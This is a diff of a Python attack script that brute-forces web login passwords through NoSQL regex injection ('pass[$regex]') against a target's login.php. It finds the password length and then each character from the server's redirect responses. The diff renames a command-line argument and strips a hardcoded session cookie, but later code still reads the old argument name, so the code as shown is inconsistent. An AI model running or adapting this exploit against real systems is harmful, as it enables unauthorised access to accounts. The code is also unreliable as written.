@@ -3,7 +3,7 @@ import argparse
 
 parser = argparse.ArgumentParser(description='Brute force password for nosql databases.')
 parser.add_argument('--host', type=str, help='Target Ip')
-parser.add_argument('--username', type=str, help='Enumerated host name')
+parser.add_argument('--user', type=str, help='Enumerated host name')
 arg = parser.parse_args()
 
 url = f'http://{arg.host}/login.php'
@@ -14,8 +14,7 @@ uName = arg.username
 i=1
 while True:
     myData = 'user='+uName+'&pass[$regex]=^.{'+str(i)+'}$&remember=on'
-    sReq = requests.post(url, data=myData, allow_redirects=False, headers={'Cookie': 
-'PHPSESSID=vjqv6iqd8e5ld46r0au086dcei', 'Content-Type': 'application/x-www-form-urlencoded'})
+    sReq = requests.post(url, data=myData, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'})
     answers = sReq.headers
     if answers['Location'] != '/?err=1':
         pLength = i
@@ -39,8 +38,7 @@ print(myData)
 while pLength:
     for i in words:
         myData = myData[:numb]+i+myData[numb+1:]
-        x = requests.post(url, data=myData, allow_redirects=False, headers={'Cookie': 
-'PHPSESSID=vjqv6iqd8e5ld46r0au086dcei', 'Content-Type': 'application/x-www-form-urlencoded'})
+        x = requests.post(url, data=myData, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'})
         answers = x.headers
 
         # Not getting redirected to error page means we have that one characted and we can move on to enumerating teh next character.
